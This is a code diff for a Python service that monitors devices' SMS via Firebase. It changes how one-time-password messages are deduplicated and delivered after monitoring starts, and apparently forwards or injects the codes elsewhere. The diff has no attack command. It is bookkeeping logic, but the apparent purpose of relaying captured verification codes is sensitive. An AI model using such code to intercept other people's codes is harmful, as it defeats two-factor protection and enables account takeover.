@@ -296,7 +296,6 @@ def _set_baseline_high_water(
     meta = _meta_dict(device)
     meta[MESSAGES_HIGH_WATER_META] = int(high_water)
     meta[BASELINE_META_KEY] = []
-    meta[SEEN_META_KEY] = []
     if started_at:
         meta[BASELINE_AT_META_KEY] = _started_iso(started_at)
     _save_meta(device, meta)
@@ -314,8 +313,15 @@ def _should_deliver_otp_record(
     record: dict[str, Any],
     device: Device,
 ) -> bool:
-    """Deliver any unseen tail SMS — never skip gaps via numeric high-water."""
-    return _record_dedup_key(record) not in get_seen_sms_keys(device)
+    """Only SMS after monitoring baseline — every new one, no gap skip among new."""
+    dedup = _record_dedup_key(record)
+    if dedup in get_seen_sms_keys(device):
+        return False
+    push_id = _message_push_id(record)
+    if push_id is not None:
+        # Baseline watermark is fixed at /startmonitor; do not advance on delivery.
+        return push_id > _messages_high_water(device)
+    return _message_leaf_key(record) is not None
 
 
 def _looks_like_incoming_sms(sender: str, body: str) -> bool:
@@ -981,6 +987,7 @@ async def snapshot_firebase_sms_seen(
     root = firebase_root_url(firebase_url)
     high_water = 0
     ignored = 0
+    all_seen: set[str] = set()
     try:
         for device_id in _device_ids(device):
             high_water = max(
@@ -991,7 +998,16 @@ async def snapshot_firebase_sms_seen(
                 ),
             )
             shallow = await _fetch_messages_shallow_keys(root, device_id, SNAPSHOT_TIMEOUT_SEC)
-            ignored = max(ignored, len(shallow))
+            all_seen |= shallow
+            for key in shallow:
+                leaf = key.rsplit("/", 1)[-1]
+                try:
+                    high_water = max(high_water, int(leaf))
+                except ValueError:
+                    continue
+        if all_seen:
+            mark_sms_keys_seen(device, all_seen)
+            ignored = len(all_seen)
     except (asyncio.TimeoutError, httpx.HTTPError) as exc:
         logger.warning("Firebase SMS baseline fetch failed for %s: %s", device.name, exc)
         _set_baseline_high_water(device, 0, profile.started_at)
@@ -1133,7 +1149,11 @@ async def _ensure_messages_high_water(
 ) -> int:
     """First poll cycle — lock current Firebase tail without delivering backlog."""
     hw = _messages_high_water(device)
-    if hw > 0:
+    started = _started_iso(profile.started_at)
+    meta = _meta_dict(device)
+    baseline_at = meta.get(BASELINE_AT_META_KEY)
+    seen_count = len(get_seen_sms_keys(device))
+    if hw > 0 and baseline_at == started and seen_count > 0:
         return hw
 
     root = firebase_root_url(firebase_url)
@@ -1290,8 +1310,6 @@ async def _poll_messages_otp_only(
         )
         mark_sms_keys_seen(device, {dedup})
         mark_inject_done_keys(device, {dedup})
-        if push_id is not None:
-            _bump_messages_high_water(device, int(push_id))
         delivered += 1
         db.commit()
         logger.info(
